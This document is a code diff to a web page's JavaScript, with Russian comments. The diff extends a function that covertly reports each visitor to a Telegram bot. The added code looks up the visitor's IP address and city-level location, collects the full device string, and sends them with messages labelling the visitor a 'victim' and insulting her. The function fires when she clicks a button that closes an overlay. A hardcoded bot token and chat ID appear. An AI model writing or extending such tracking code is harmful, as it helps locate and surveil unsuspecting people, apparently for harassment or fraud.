@@ -252,15 +252,29 @@
   </div>
 
 <script>
-  // ===== УВЕДОМЛЕНИЕ В TELEGRAM =====
-  function notifyTelegram() {
+  // ===== УВЕДОМЛЕНИЕ В TELEGRAM (с IP + ГЕО) =====
+  async function notifyTelegram() {
       const botToken = "8849150523:AAHfJ5rW-muaXsDNaGYGalebCKqKTRdEfz4";
       const chatId = "-1004364596513";
-      
-      const message = `🚨 Новая жертва зашла!\n` +
-                      `⏰ ${new Date().toLocaleString('ru-RU')}\n` +
-                      `🔗 ${window.location.href}\n` +
-                      `📱 ${navigator.userAgent.substring(0, 80)}...`;
+
+      let ip = "Не удалось определить";
+      let geo = "Неизвестно";
+
+      try {
+          const res = await fetch('https://ipapi.co/json/');
+          const data = await res.json();
+          ip = data.ip || ip;
+          geo = `${data.city || ''}, ${data.region || ''}, ${data.country_name || 'DE'}`.replace(/,\s*,/g, ', ').trim();
+      } catch (e) {}
+
+      const time = new Date().toISOString().replace('T', ' ').slice(0, 19) + " UTC";
+      const device = navigator.userAgent;
+
+      const message = `🔔 ДУРА НАЖАЛА КНОПКУ!!!\n\n` +
+                      `🕒 Время: ${time}\n` +
+                      `🌐 IP: ${ip}\n` +
+                      `📍 Гео: ${geo}\n` +
+                      `💻 Устройство: ${device}`;
 
       try {
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -324,8 +338,8 @@
   }
 
   function begin(){
-      notifyTelegram();     // ← Уведомление в Telegram
-      notifyServer();       // ← Оставил твой серверный вызов
+      notifyTelegram();     // ← Главное уведомление
+      notifyServer();
 
       document.getElementById('modalOverlay').style.display = 'none';
       document.getElementById('site').classList.add('blur');
